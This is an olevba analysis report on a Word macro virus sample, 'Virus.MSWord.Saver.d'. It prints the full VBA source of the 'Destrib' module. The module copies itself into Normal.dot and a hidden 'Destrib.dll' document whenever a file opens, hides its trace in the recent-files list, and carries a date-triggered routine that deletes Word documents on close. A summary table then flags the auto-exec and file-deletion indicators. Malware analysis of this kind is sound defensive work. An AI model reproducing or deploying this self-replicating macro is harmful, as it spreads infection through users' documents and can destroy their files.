olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Saver.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Saver.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Destrib.bas 
in file: Virus.MSWord.Saver.d - OLE stream: 'Macros/VBA/Destrib'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Setup()
Attribute Setup.VB_Description = "MS - Маздай!"
  Word.Options.VirusProtection = True
  On Error Resume Next
  
  zz = Word.ActiveDocument.FullName
  
  Application.OrganizerCopy Source:=zz, _
      Destination:=Normal.ThisDocument.FullName, Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
      
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=zz, Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
      
  yy = Word.Application.Path + "\Destrib.dll"
  
  If (Dir(yy) = "") Then
    Application.Documents.Add
    Application.Documents(1).SaveAs (yy)
    Application.Documents(1).Close SaveChanges:=False
    Word.RecentFiles.Item(1).Delete
  End If
  
  
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=yy, Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=zz, _
      Destination:=yy, Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=yy, _
      Destination:=zz, Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
      
End Sub

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "MS - Маздай!"
  Setup
  If Word.ActiveDocument.Name = "Destrib.dll" Then Word.ActiveDocument.Close
End Sub

Sub AutoClose()
Attribute AutoClose.VB_Description = "MS - Маздай!"
  If Word.ActiveDocument.Name <> "Destrib.dll" Then
    On Error Resume Next
    If Day(Date) = 33 Then Kill "*.do?"
  End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|IOC       |Destrib.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

